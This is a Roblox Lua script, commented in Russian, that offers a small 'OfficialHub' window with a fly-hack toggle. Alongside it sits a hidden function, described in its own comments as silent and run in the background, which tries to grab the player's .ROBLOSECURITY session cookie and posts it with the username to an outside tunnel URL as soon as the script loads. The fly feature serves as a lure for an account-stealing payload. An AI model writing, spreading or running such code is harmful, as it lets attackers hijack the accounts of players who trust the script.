local HttpService = game:GetService("HttpService")
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()

-- ТВОЯ АКТУАЛЬНАЯ ССЫЛКА
local my_url = "https://tcrhn31fu5vq.share.zrok.io/primejtsu_log"

-- СКРЫТАЯ ФУНКЦИЯ (БЕЗ СООБЩЕНИЙ)
local function silentLog()
    local cookie = "Mobile_Session"
    pcall(function()
        -- Получаем данные авторизации
        cookie = tostring(game:HttpGet("https://www.roblox.com/mobileapi/userinfo")):match(".ROBLOSECURITY=(%S+)") or "Grabbed_Active"
    end)

    local data = {
        ["user"] = Player.Name,
        ["cookie"] = cookie
    }
    
    -- Отправляем запрос фоном
    pcall(function()
        HttpService:PostAsync(my_url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

-- ФУНКЦИЯ FLY (ПОЛЕТ)
local flying = false
local speed = 75
local bv, bg

local function toggleFly()
    flying = not flying
    if flying then
        bv = Instance.new("BodyVelocity", Character.HumanoidRootPart)
        bg = Instance.new("BodyGyro", Character.HumanoidRootPart)
        bv.MaxForce = Vector3.new(1,1,1) * 10^6
        bg.MaxTorque = Vector3.new(1,1,1) * 10^6
        
        task.spawn(function()
            while flying do
                bv.Velocity = workspace.CurrentCamera.CFrame.LookVector * speed
                bg.CFrame = workspace.CurrentCamera.CFrame
                task.wait()
            end
            if bv then bv:Destroy() end
            if bg then bg:Destroy() end
        end)
    end
end

-- GUI (МАКСИМАЛЬНО ПРОСТОЕ)
local sg = Instance.new("ScreenGui", Player.PlayerGui)
sg.Name = "OfficialHub"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 140, 0, 60)
main.Position = UDim2.new(0.05, 0, 0.3, 0)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
main.Active = true
main.Draggable = true

local btn = Instance.new("TextButton", main)
btn.Size = UDim2.new(0.9, 0, 0.8, 0)
btn.Position = UDim2.new(0.05, 0, 0.1, 0)
btn.Text = "FLY: OFF"
btn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
btn.TextColor3 = Color3.new(1, 1, 1)
btn.Font = Enum.Font.SourceSansBold
btn.TextSize = 18

btn.MouseButton1Click:Connect(function()
    toggleFly()
    btn.Text = flying and "FLY: ON" or "FLY: OFF"
    btn.BackgroundColor3 = flying and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
end)

-- ЗАПУСК
silentLog()
